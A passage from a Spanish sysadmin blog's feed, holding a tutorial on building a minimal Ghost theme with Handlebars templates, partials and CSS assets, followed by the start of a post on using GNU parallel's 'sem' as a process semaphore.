&lt;p&gt;Las plantillas están escritas en un motor de plantillas llamado &lt;a href="http://handlebarsjs.com/"&gt;Handlebars&lt;/a&gt;, y podemos encontrar un resume enfocado a &lt;strong&gt;Ghost&lt;/strong&gt; en &lt;a href="https://themes.ghost.org/docs/handlebars"&gt;la documentación&lt;/a&gt;. Como convención, todos los ficheros &lt;em&gt;.hbs&lt;/em&gt; en un tema de &lt;strong&gt;Ghost&lt;/strong&gt; son plantillas en este lenguaje.&lt;/p&gt;
&lt;p&gt;El uso de una instancia nueva nos viene muy bien, porque tenemos un índice y un &lt;em&gt;post&lt;/em&gt;, que nos permitirán ver como evoluciona nuestro &lt;em&gt;blog&lt;/em&gt;, a medida que avanzamos en el artículo.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Índice -&amp;gt; &lt;a href="http://localhost:2368/"&gt;http://localhost:2368/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Post -&amp;gt; &lt;a href="http://localhost:2368/welcome-to-ghost/"&gt;http://localhost:2368/welcome-to-ghost/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Un tema vacío&lt;/h2&gt;
&lt;p&gt;Vamos a crear una carpeta local temporal con los ficheros requeridos, que luego vamos a comprimir en fichero &lt;em&gt;.zip&lt;/em&gt; para poder cargarlo en la interfaz de administración. Una vez &lt;strong&gt;Ghost&lt;/strong&gt; ya reconozca nuestro tema, no vamos a tener que reiniciar ningún proceso nunca.&lt;/p&gt;
&lt;p&gt;De acuerdo a la &lt;a href="https://themes.ghost.org/docs/structure"&gt;documentación de Ghost&lt;/a&gt;, se necesitan un mínimo de 3 ficheros, que son el &lt;em&gt;package.json&lt;/em&gt;, &lt;em&gt;index.hbs&lt;/em&gt; y &lt;em&gt;post.hbs&lt;/em&gt;. Podemos encontrar la descripción de cada fichero en otro apartado de &lt;a href="https://themes.ghost.org/docs/templates"&gt;la documentación&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Voy a poner lo justo para que se pueda cargar el tema, aunque no sea muy funcional, para ir creciendo a partir de aquí.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace$ tree minimal_theme/
minimal_theme/
├── index.hbs
├── package.json
└── post.hbs

&lt;span class="m"&gt;0&lt;/span&gt; directories, &lt;span class="m"&gt;3&lt;/span&gt; files
gerard@aldebaran:~/workspace$ cat minimal_theme/package.json 
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;minimal_theme&amp;quot;&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;0.0.0&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/workspace$ cat minimal_theme/index.hbs 
INDEX
gerard@aldebaran:~/workspace$ cat minimal_theme/post.hbs 
POST
gerard@aldebaran:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para cargarlo cómodamente desde la interfaz web, lo necesitamos en formato &lt;em&gt;.zip&lt;/em&gt;. De hecho, la carpeta contenedora tampoco nos importa, así que la podemos borrar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace$ &lt;span class="nb"&gt;cd&lt;/span&gt; minimal_theme/
gerard@aldebaran:~/workspace/minimal_theme$ zip -r ../minimal_theme.zip *
  adding: index.hbs &lt;span class="o"&gt;(&lt;/span&gt;stored &lt;span class="m"&gt;0&lt;/span&gt;%&lt;span class="o"&gt;)&lt;/span&gt;
  adding: package.json &lt;span class="o"&gt;(&lt;/span&gt;deflated &lt;span class="m"&gt;10&lt;/span&gt;%&lt;span class="o"&gt;)&lt;/span&gt;
  adding: post.hbs &lt;span class="o"&gt;(&lt;/span&gt;stored &lt;span class="m"&gt;0&lt;/span&gt;%&lt;span class="o"&gt;)&lt;/span&gt;
gerard@aldebaran:~/workspace/minimal_theme$ &lt;span class="nb"&gt;cd&lt;/span&gt; ..
gerard@aldebaran:~/workspace$ rm -R minimal_theme/
gerard@aldebaran:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es importante mencionar que el fichero &lt;em&gt;.zip&lt;/em&gt; no debe contener la carpeta contenedora, sino sus ficheros. Para entendernos, los 3 ficheros deben quedar en la raíz del fichero comprimido.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace$ unzip -l minimal_theme.zip 
Archive:  minimal_theme.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        &lt;span class="m"&gt;6&lt;/span&gt;  &lt;span class="m"&gt;2016&lt;/span&gt;-09-23 &lt;span class="m"&gt;12&lt;/span&gt;:41   index.hbs
       &lt;span class="m"&gt;52&lt;/span&gt;  &lt;span class="m"&gt;2016&lt;/span&gt;-09-23 &lt;span class="m"&gt;12&lt;/span&gt;:41   package.json
        &lt;span class="m"&gt;5&lt;/span&gt;  &lt;span class="m"&gt;2016&lt;/span&gt;-09-23 &lt;span class="m"&gt;12&lt;/span&gt;:41   post.hbs
---------                     -------
       &lt;span class="m"&gt;63&lt;/span&gt;                     &lt;span class="m"&gt;3&lt;/span&gt; files
gerard@aldebaran:~/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lo cargamos desde la interfaz de administración, en &lt;em&gt;Settings / General / Themes / Upload a theme&lt;/em&gt;. La idea es que a partir de ahora vamos a editar el tema desde la carpeta &lt;em&gt;/var/lib/ghost/themes/minimal_theme/&lt;/em&gt;; como yo he usado un volumen local, lo voy a editar cómodamente desde &lt;em&gt;/home/gerard/workspace/content/themes/minimal_theme/&lt;/em&gt;. Cuando tengamos algo digno de ser guardado, lo podemos descargar en la misma sección de la interfaz administrativa, en formato &lt;em&gt;.zip&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;En este punto, deberíamos ver una página principal con el contenido "INDEX" y la página del &lt;em&gt;post&lt;/em&gt; de bienvenida como "POST", porque la plantilla no hace nada con los objetos que recibe de &lt;strong&gt;Ghost&lt;/strong&gt;. Vamos a continuar mejorando estas plantillas en los siguientes apartados.&lt;/p&gt;
&lt;h2&gt;Plantilla base e inyección de plantillas parciales&lt;/h2&gt;
&lt;p&gt;Las plantillas deberían sacar contenido HTML. Como ya sabemos, hay muchos elementos comunes que se van a repetir en todas las plantillas, por ejemplo, los &lt;em&gt;tags&lt;/em&gt; propios de HTML, como el &lt;em&gt;&amp;lt;html&amp;gt;&lt;/em&gt;, el &lt;em&gt;&amp;lt;head&amp;gt;&lt;/em&gt; o el &lt;em&gt;&amp;lt;body&amp;gt;&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La solución mas elegante para este problema es la herencia de plantillas. La idea es que nuestra plantilla se va a insertar en una mas general, de forma que todas tengan un esqueleto común.&lt;/p&gt;
&lt;p&gt;También tenemos la opción de tener trozos de plantilla preparados para ser incluidos en otras plantillas, por ejemplo, la cabecera, el código de seguimiento o el contador de visitas. Estos trozos se llaman &lt;em&gt;partials&lt;/em&gt; y tienen una carpeta con el mismo nombre.&lt;/p&gt;
&lt;p&gt;Para ver como funcionan ambos, vamos a crear un esqueleto HTML. Este esqueleto va a incluir un &lt;em&gt;partial&lt;/em&gt; con la cabecera del &lt;em&gt;blog&lt;/em&gt;. De esta forma conseguimos separar conceptos, para que sea mas legible y mas fácil de modificar a &lt;em&gt;posteriori&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para ello vamos a crear nuevos ficheros, que son la plantilla base &lt;em&gt;default.hbs&lt;/em&gt; y la plantilla de la cabecera en &lt;em&gt;partials/header.hbs&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/content/themes/minimal_theme$ tree
.
├── partials
│   └── header.hbs
├── default.hbs
├── index.hbs
├── package.json
└── post.hbs

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;5&lt;/span&gt; files
gerard@aldebaran:~/workspace/content/themes/minimal_theme$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El primer paso consiste en indicar a las plantillas antes creadas que queremos que hereden de la plantilla &lt;em&gt;default&lt;/em&gt;, con el símbolo &lt;code&gt;{{!&amp;lt; default}}&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/content/themes/minimal_theme$ cat index.hbs 
&lt;span class="o"&gt;{{&lt;/span&gt;!&amp;lt; default&lt;span class="o"&gt;}}&lt;/span&gt;

INDEX
gerard@aldebaran:~/workspace/content/themes/minimal_theme$ cat post.hbs 
&lt;span class="o"&gt;{{&lt;/span&gt;!&amp;lt; default&lt;span class="o"&gt;}}&lt;/span&gt;

POST
gerard@aldebaran:~/workspace/content/themes/minimal_theme$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lo siguiente es escribir una plantilla &lt;em&gt;default.hbs&lt;/em&gt;. Esta plantilla debe contener la expresión &lt;em&gt;handlebars&lt;/em&gt; &lt;code&gt;{{{body}}}&lt;/code&gt;, que es donde se va a insertar la plantilla real.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/content/themes/minimal_theme$ cat default.hbs 
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html &lt;span class="nv"&gt;lang&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;es&amp;quot;&lt;/span&gt;&amp;gt;
  &amp;lt;head&amp;gt;
    &amp;lt;meta &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&amp;gt;
    &amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;
&lt;span class="o"&gt;{{&lt;/span&gt;ghost_head&lt;span class="o"&gt;}}&lt;/span&gt;
  &amp;lt;/head&amp;gt;
  &amp;lt;body&amp;gt;
&lt;span class="o"&gt;{{&lt;/span&gt;&amp;gt; header&lt;span class="o"&gt;}}&lt;/span&gt;
&lt;span class="o"&gt;{{{&lt;/span&gt;body&lt;span class="o"&gt;}}}&lt;/span&gt;
&lt;span class="o"&gt;{{&lt;/span&gt;ghost_foot&lt;span class="o"&gt;}}&lt;/span&gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
gerard@aldebaran:~/workspace/content/themes/minimal_theme$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a fijarnos en 3 expresiones nuevas, que son &lt;code&gt;{{&amp;gt; header}}&lt;/code&gt;, &lt;code&gt;{{ghost_head}}&lt;/code&gt; y &lt;code&gt;{{ghost_foot}}&lt;/code&gt;. La primera sirve para insertar un &lt;em&gt;partial&lt;/em&gt;, que va a ser el resultado de procesar &lt;em&gt;partials/header.hbs&lt;/em&gt;. Las otras dos, aunque no son estrictamente necesarias, son recomendadas por la documentación de &lt;strong&gt;Ghost&lt;/strong&gt;. Básicamente incluyen algunos &lt;em&gt;metatags&lt;/em&gt; y cualquier &lt;em&gt;snippet&lt;/em&gt; que pongamos como &lt;em&gt;Code Injection&lt;/em&gt; en el panel de administración web.&lt;/p&gt;
&lt;p&gt;Solo faltaría poner algo de código en el &lt;em&gt;partial&lt;/em&gt; de la cabecera para que sea útil incluirlo. Vamos a pecar otra vez de simplicidad.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/content/themes/minimal_theme$ cat partials/header.hbs 
&amp;lt;h1&amp;gt;Title&amp;lt;/h1&amp;gt;
gerard@aldebaran:~/workspace/content/themes/minimal_theme$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: Si miramos el &lt;em&gt;blog&lt;/em&gt; ahora, veremos que da un error 500. Esto es debido a que &lt;strong&gt;Ghost&lt;/strong&gt; no ha cargado los nuevos ficheros. Como solución, basta con activar otro tema, y volver a activar el nuestro.&lt;/p&gt;
&lt;h2&gt;Usando variables en las plantillas&lt;/h2&gt;
&lt;p&gt;Cada plantilla dispone de sus variables para que las usemos. Algunas de las variables están disponibles para todas las plantillas. De esta forma podemos generar contenido HTML real a partir de lo que hay en la base de datos de &lt;strong&gt;Ghost&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Vamos a empezar con el título del &lt;em&gt;blog&lt;/em&gt;, visible en el &lt;em&gt;tag&lt;/em&gt; &lt;code&gt;title&lt;/code&gt; de la plantilla &lt;em&gt;default.hbs&lt;/em&gt; y en la cabecera &lt;em&gt;partials/header.hbs&lt;/em&gt;. Para poner el título real del &lt;em&gt;blog&lt;/em&gt; (tal como se define en la interfaz de administración), vamos a usar la variable &lt;code&gt;{{@blog.title}}&lt;/code&gt;. Podéis encontrar todas las variables disponibles en la documentación.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/content/themes/minimal_theme$ cat default.hbs 
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html &lt;span class="nv"&gt;lang&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;es&amp;quot;&lt;/span&gt;&amp;gt;
  &amp;lt;head&amp;gt;
    &amp;lt;meta &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&amp;gt;
    &amp;lt;title&amp;gt;&lt;span class="o"&gt;{{&lt;/span&gt;@blog.title&lt;span class="o"&gt;}}&lt;/span&gt;&amp;lt;/title&amp;gt;
&lt;span class="o"&gt;{{&lt;/span&gt;ghost_head&lt;span class="o"&gt;}}&lt;/span&gt;
  &amp;lt;/head&amp;gt;
  &amp;lt;body&amp;gt;
&lt;span class="o"&gt;{{&lt;/span&gt;&amp;gt; header&lt;span class="o"&gt;}}&lt;/span&gt;
&lt;span class="o"&gt;{{{&lt;/span&gt;body&lt;span class="o"&gt;}}}&lt;/span&gt;
&lt;span class="o"&gt;{{&lt;/span&gt;ghost_foot&lt;span class="o"&gt;}}&lt;/span&gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
gerard@aldebaran:~/workspace/content/themes/minimal_theme$ cat partials/header.hbs 
&amp;lt;h1&amp;gt;&lt;span class="o"&gt;{{&lt;/span&gt;@blog.title&lt;span class="o"&gt;}}&lt;/span&gt;&amp;lt;/h1&amp;gt;
gerard@aldebaran:~/workspace/content/themes/minimal_theme$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para las otras plantillas, el truco consiste en localizar que variables tenemos disponibles. Podemos encontrar el contexto para cada plantilla en la barra lateral de la configuración, en el &lt;em&gt;Context Reference&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;En el caso de la plantilla &lt;em&gt;index.hbs&lt;/em&gt;, podemos mirar en &lt;a href="https://themes.ghost.org/docs/index-context"&gt;su contexto&lt;/a&gt;. De ahí se deduce que tenemos una variable &lt;em&gt;posts&lt;/em&gt; que solo tenemos que iterar para listar cada uno, de la forma que mas nos guste. Siguiendo el enlace a &lt;a href="https://themes.ghost.org/docs/post-context#post-object-attributes"&gt;post object&lt;/a&gt;, podemos ver qué campos hay para dibujar en la plantilla. Vamos a utilizar el &lt;em&gt;title&lt;/em&gt; y el &lt;em&gt;excerpt&lt;/em&gt; (título del &lt;em&gt;post&lt;/em&gt; y un resumen del mismo).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/content/themes/minimal_theme$ cat index.hbs 
&lt;span class="o"&gt;{{&lt;/span&gt;!&amp;lt; default&lt;span class="o"&gt;}}&lt;/span&gt;

&lt;span class="o"&gt;{{&lt;/span&gt;&lt;span class="c1"&gt;#foreach posts}}&lt;/span&gt;
&amp;lt;h2&amp;gt;&lt;span class="o"&gt;{{&lt;/span&gt;title&lt;span class="o"&gt;}}&lt;/span&gt;&amp;lt;/h2&amp;gt;
&amp;lt;p&amp;gt;&lt;span class="o"&gt;{{&lt;/span&gt;excerpt&lt;span class="o"&gt;}}&lt;/span&gt;&amp;lt;/p&amp;gt;
&lt;span class="o"&gt;{{&lt;/span&gt;/foreach&lt;span class="o"&gt;}}&lt;/span&gt;
gerard@aldebaran:~/workspace/content/themes/minimal_theme$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Simple, pero suficiente. Por brevedad, no se ha incluido ningún trato del la variable &lt;code&gt;{{pagination}}&lt;/code&gt;. Si hacéis temas en el futuro, vais a tener que utilizarla.&lt;/p&gt;
&lt;p&gt;La plantilla &lt;em&gt;post.hbs&lt;/em&gt;, de similar forma, obtiene la variable &lt;em&gt;post&lt;/em&gt; y un ejemplo de como iterarla. Su documentación de contexto está &lt;a href="https://themes.ghost.org/docs/post-context"&gt;aquí&lt;/a&gt;. Vamos a pintar el título del artículo y su contenido (&lt;em&gt;title&lt;/em&gt; y &lt;em&gt;content&lt;/em&gt; respectivamente).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/content/themes/minimal_theme$ cat post.hbs 
&lt;span class="o"&gt;{{&lt;/span&gt;!&amp;lt; default&lt;span class="o"&gt;}}&lt;/span&gt;

&lt;span class="o"&gt;{{&lt;/span&gt;&lt;span class="c1"&gt;#post}}&lt;/span&gt;
&amp;lt;h2&amp;gt;&lt;span class="o"&gt;{{&lt;/span&gt;title&lt;span class="o"&gt;}}&lt;/span&gt;&amp;lt;/h2&amp;gt;
&lt;span class="o"&gt;{{&lt;/span&gt;content&lt;span class="o"&gt;}}&lt;/span&gt;
&lt;span class="o"&gt;{{&lt;/span&gt;/post&lt;span class="o"&gt;}}&lt;/span&gt;      
gerard@aldebaran:~/workspace/content/themes/minimal_theme$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nuevamente, un ejemplo simple y breve; no soy diseñador gráfico. Pero se entiende, ¿no?&lt;/p&gt;
&lt;h2&gt;Hojas de estilo, javascript y otros ficheros auxiliares&lt;/h2&gt;
&lt;p&gt;Cuando escribimos un tema, muchas veces necesitamos de otros ficheros, mas allá del contenido HTML. En la jerga de &lt;strong&gt;Ghost&lt;/strong&gt; se llaman &lt;em&gt;assets&lt;/em&gt; y nos ofrece una forma muy fácil de hacerlo. Tenemos un &lt;em&gt;helper&lt;/em&gt; llamado &lt;em&gt;asset&lt;/em&gt; que podemos usar. Un &lt;em&gt;asset&lt;/em&gt; puede ser una hoja de estilo, un fichero &lt;em&gt;javascript&lt;/em&gt;, una imagen, una fuente y en general, cualquier tipo de recurso.&lt;/p&gt;
&lt;p&gt;Para demostrar como se usa, vamos a incluir una hoja de estilo en nuestro tema. Como queremos que esté disponible en todas las páginas, la podemos poner en la plantilla base. La idea es que va a ser el código HTML normal, pero en vez de dar la ruta nosotros, vamos a poner &lt;code&gt;{{asset "css/style.css"}}&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/content/themes/minimal_theme$ cat default.hbs 
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html &lt;span class="nv"&gt;lang&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;es&amp;quot;&lt;/span&gt;&amp;gt;
  &amp;lt;head&amp;gt;
    &amp;lt;meta &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&amp;gt;
    &amp;lt;title&amp;gt;&lt;span class="o"&gt;{{&lt;/span&gt;@blog.title&lt;span class="o"&gt;}}&lt;/span&gt;&amp;lt;/title&amp;gt;
    &amp;lt;link &lt;span class="nv"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;text/css&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;{{asset &amp;quot;&lt;/span&gt;css/style.css&lt;span class="s2"&gt;&amp;quot;}}&amp;quot;&lt;/span&gt; /&amp;gt;
&lt;span class="o"&gt;{{&lt;/span&gt;ghost_head&lt;span class="o"&gt;}}&lt;/span&gt;
  &amp;lt;/head&amp;gt;
  &amp;lt;body&amp;gt;
&lt;span class="o"&gt;{{&lt;/span&gt;&amp;gt; header&lt;span class="o"&gt;}}&lt;/span&gt;
&lt;span class="o"&gt;{{{&lt;/span&gt;body&lt;span class="o"&gt;}}}&lt;/span&gt;
&lt;span class="o"&gt;{{&lt;/span&gt;ghost_foot&lt;span class="o"&gt;}}&lt;/span&gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
gerard@aldebaran:~/workspace/content/themes/minimal_theme$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como le hemos indicado que queremos el &lt;em&gt;asset&lt;/em&gt; localizado en &lt;em&gt;css/style.css&lt;/em&gt;, tenemos que crear esta estructura dentro de la carpeta &lt;em&gt;assets&lt;/em&gt;, que crearemos también si no la tenemos. El fichero &lt;em&gt;.css&lt;/em&gt; va a ser bastante simple, para no aburrir con detalles de diseño.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/content/themes/minimal_theme$ cat assets/css/style.css 
body &lt;span class="o"&gt;{&lt;/span&gt;
    background-color: cyan&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/workspace/content/themes/minimal_theme$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sinceramente espero que seáis mejores en el diseño gráfico que yo... Aunque lo importante es que si miramos el &lt;em&gt;blog&lt;/em&gt;, se ha aplicado el estilo definido. Podéis añadir mas &lt;em&gt;assets&lt;/em&gt; hasta que os canséis de ello.&lt;/p&gt;
&lt;h2&gt;A partir de aquí...&lt;/h2&gt;
&lt;p&gt;Como detalle final, solo queda decir que podéis generar mas plantillas, que van a ser cargadas en el orden de preferencia, como se indica en &lt;a href="https://themes.ghost.org/docs/context-overview#section-context-table"&gt;la documentación&lt;/a&gt;. Fijaos en las columnas &lt;em&gt;URL&lt;/em&gt; y &lt;em&gt;Template&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Por ejemplo, la plantilla que se usa para la URL &lt;em&gt;/tag/ghost&lt;/em&gt; sería &lt;em&gt;tag-ghost.hbs&lt;/em&gt;; en caso de no haber dicha plantilla, se utilizaría &lt;em&gt;tag.hbs&lt;/em&gt;; en caso de fallar ambas (como es el caso de este tutorial), se utilizaría &lt;em&gt;index.hbs&lt;/em&gt; (que está porque es una de las requeridas).&lt;/p&gt;
&lt;p&gt;Ya tenéis todas las herramientas necesarias para escribir y para entender temas de &lt;strong&gt;Ghost&lt;/strong&gt;. Con un poco de esfuerzo y ganas, os puede quedar un tema propio genial.&lt;/p&gt;
&lt;p&gt;En este punto, me voy a la interfaz de administración, y me descargo mi tema, a modo de &lt;em&gt;backup&lt;/em&gt;. Si os interesa, os lo dejo &lt;a href="http://www.linuxsysadmin.ml/downloads/minimal_theme.zip"&gt;aquí&lt;/a&gt;.&lt;/p&gt;</content><category term="ghost"></category><category term="blog"></category><category term="tema"></category></entry><entry><title>Semáforos en linux</title><link href="http://www.linuxsysadmin.ml/2016/11/semaforos-en-linux.html" rel="alternate"></link><published>2016-11-28T08:00:00+01:00</published><updated>2016-11-28T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-11-28:/2016/11/semaforos-en-linux.html</id><summary type="html">&lt;p&gt;Tras revisar un &lt;em&gt;bug&lt;/em&gt; de cierto proceso en &lt;em&gt;background&lt;/em&gt; de una aplicación en mi trabajo, vimos que saltaban dos ejecuciones simultáneas y los dos procesos interferían entre ellos. Implementar una exclusión mutua en el proceso era costoso, así que opté por hacerlo con un comando &lt;strong&gt;linux&lt;/strong&gt;, que descubrí por internet …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Tras revisar un &lt;em&gt;bug&lt;/em&gt; de cierto proceso en &lt;em&gt;background&lt;/em&gt; de una aplicación en mi trabajo, vimos que saltaban dos ejecuciones simultáneas y los dos procesos interferían entre ellos. Implementar una exclusión mutua en el proceso era costoso, así que opté por hacerlo con un comando &lt;strong&gt;linux&lt;/strong&gt;, que descubrí por internet.&lt;/p&gt;
&lt;p&gt;La idea es que podemos asegurar que un comando o &lt;em&gt;script&lt;/em&gt; pase por un semáforo tal como lo entienden en procesos concurrentes; se marca una zona de exclusión en donde solo un número determinado de procesos pueden estar a la vez. En el caso concreto de un solo proceso, se conoce como un &lt;em&gt;mutex&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Así pues, si tenemos un disparador de eventos, como por ejemplo &lt;strong&gt;incron&lt;/strong&gt;, podemos evitar una avalancha de procesos disparados en un plazo de tiempo minúsculo, limitando el &lt;em&gt;stress&lt;/em&gt; causado a la carga del sistema, y evitando también, problemas derivados de que nuestro proceso no acepte concurrencia.&lt;/p&gt;
&lt;p&gt;Como ya va siendo habitual, vamos a empezar instalando el paquete que ofrece la utilidad &lt;em&gt;sem&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# apt-get install -y parallel
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following extra packages will be installed:
  libalgorithm-c3-perl libarchive-extract-perl libcgi-fast-perl libcgi-pm-perl libclass-c3-perl libclass-c3-xs-perl libcpan-meta-perl libdata-optlist-perl libdata-section-perl libfcgi-perl
  libgdbm3 liblog-message-perl liblog-message-simple-perl libmodule-build-perl libmodule-pluggable-perl libmodule-signature-perl libmro-compat-perl libpackage-constants-perl
  libparams-util-perl libpod-latex-perl libpod-readme-perl libregexp-common-perl libsoftware-license-perl libsub-exporter-perl libsub-install-perl libterm-ui-perl libtext-soundex-perl
  libtext-template-perl perl perl-modules rename
Suggested packages:
  perl-doc libterm-readline-gnu-perl libterm-readline-perl-perl make libb-lint-perl libcpanplus-dist-build-perl libcpanplus-perl libfile-checktree-perl libobject-accessor-perl
Recommended packages:
  libarchive-tar-perl
The following NEW packages will be installed:
  libalgorithm-c3-perl libarchive-extract-perl libcgi-fast-perl libcgi-pm-perl libclass-c3-perl libclass-c3-xs-perl libcpan-meta-perl libdata-optlist-perl libdata-section-perl libfcgi-perl
  libgdbm3 liblog-message-perl liblog-message-simple-perl libmodule-build-perl libmodule-pluggable-perl libmodule-signature-perl libmro-compat-perl libpackage-constants-perl
  libparams-util-perl libpod-latex-perl libpod-readme-perl libregexp-common-perl libsoftware-license-perl libsub-exporter-perl libsub-install-perl libterm-ui-perl libtext-soundex-perl
  libtext-template-perl parallel perl perl-modules rename
&lt;span class="m"&gt;0&lt;/span&gt; upgraded, &lt;span class="m"&gt;32&lt;/span&gt; newly installed, &lt;span class="m"&gt;0&lt;/span&gt; to remove and &lt;span class="m"&gt;1&lt;/span&gt; not upgraded.
Need to get &lt;span class="m"&gt;6794&lt;/span&gt; kB of archives.
After this operation, &lt;span class="m"&gt;38&lt;/span&gt;.4 MB of additional disk space will be used.
...
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a partir también de un &lt;em&gt;script&lt;/em&gt; que tarde un tiempo (para darnos tiempo a probar cosas concurrentemente). Este es el &lt;em&gt;script&lt;/em&gt; que no debería tener dos ejecuciones concurrentes; recordamos que tiene permisos de ejecución.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# cat do_stuff.sh 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;date +&lt;span class="s1"&gt;&amp;#39;%H:%M:%S&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt; - Started process &lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
sleep &lt;span class="m"&gt;10&lt;/span&gt;
